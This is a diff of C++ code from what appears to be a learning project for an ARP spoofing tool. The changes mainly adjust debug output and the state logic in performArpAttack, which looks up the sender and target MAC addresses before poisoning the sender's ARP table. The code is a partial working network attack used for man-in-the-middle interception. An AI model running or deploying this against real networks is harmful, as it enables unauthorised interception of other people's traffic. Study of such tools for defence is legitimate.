@@ -82,9 +82,9 @@ void make_send_packet(EthArpPacket &packet_send, const Mac& eth_sender_mac, cons
 }
 
 void change_sender_arp_table(pcap_t* handle,const Mac& my_mac, const Mac& sender_mac, const Ip& target_ip, const Ip& sender_ip){
-	printf("Sender IP Address: %s, Target IP Address: %s\n", static_cast<std::string>(sender_ip).c_str(), static_cast<std::string>(target_ip).c_str());
-	printf("Sender MAC Address: ");
-	print_mac_address(sender_mac);
+	//printf("Sender IP Address: %s, Target IP Address: %s\n", static_cast<std::string>(sender_ip).c_str(), static_cast<std::string>(target_ip).c_str());
+	//printf("Sender MAC Address: ");
+	//print_mac_address(sender_mac);
 
 	EthArpPacket packet_send;
 	
@@ -100,12 +100,13 @@ void change_sender_arp_table(pcap_t* handle,const Mac& my_mac, const Mac& sender
 };
 
 int get_mac_address(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, Mac& dest_mac, const Ip& dest_ip){
-	printf("request (%s)'s MAC........\n", static_cast<std::string>(dest_ip).c_str());
+	//printf("request (%s)'s MAC........\n", static_cast<std::string>(dest_ip).c_str());
 
 	auto it = mac_cache.find(dest_ip);
     if (it != mac_cache.end()) {
-		printf("already in set!!!!\n");
         dest_mac = it->second;
+		printf("(already in set) IP(%s) =>  ", static_cast<std::string>(dest_ip).c_str());
+		print_mac_address(dest_mac);
         return 0;
     }
 
@@ -124,7 +125,7 @@ int get_mac_address(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, Mac& des
 };
 
 int performArpAttack(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_mac, const Ip& gateway_ip, const Ip& sender_ip, const Ip& target_ip){
-	int flag_send=1;//1: find sender mac
+	int flag_send, status;//1: find sender mac
 	//flag_send
 	//1: find sender mac
 	//2: find target mac
@@ -144,16 +145,18 @@ int performArpAttack(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_m
 	const u_char* packet_receive;
 	
 	flag_send=1;//now....
+	status=1;
 
 	while (1) {      
-		if(flag_send){//flag == 0: 수신만 기능
+		if(status){//flag == 0: 수신만 기능
 			if(flag_send==1){
 				if(get_mac_address(handle,my_mac, my_ip, sender_mac, sender_ip)) {
 					search_ip=sender_ip;
 				}else{
 					flag_send=2;
 				}
-			}else if(flag_send==2){
+			}
+			if(flag_send==2){
 				if(get_mac_address(handle,my_mac, my_ip, target_mac, target_ip)) {
 					search_ip=target_ip;
 				}else{
@@ -170,6 +173,7 @@ int performArpAttack(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_m
 				//another request...
 				return 0;
 			}
+			status = 0;
 		}
 
 		
@@ -193,9 +197,9 @@ int performArpAttack(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_m
                 print_mac_address(new_mac_addr);
 				// Update the MAC address cache
                 mac_cache[ip_of_new_addr] = new_mac_addr;
-
-				if(flag_send==1){sender_mac = new_mac_addr; flag_send=3;continue;};
-				if(flag_send==2){target_mac = new_mac_addr; flag_send=3;continue;};
+				status=1;
+				if(flag_send==1){sender_mac = new_mac_addr; flag_send=2;  continue;};
+				if(flag_send==2){target_mac = new_mac_addr; flag_send=3;  continue;};
                 //flag_send = 3;
             }
 		}
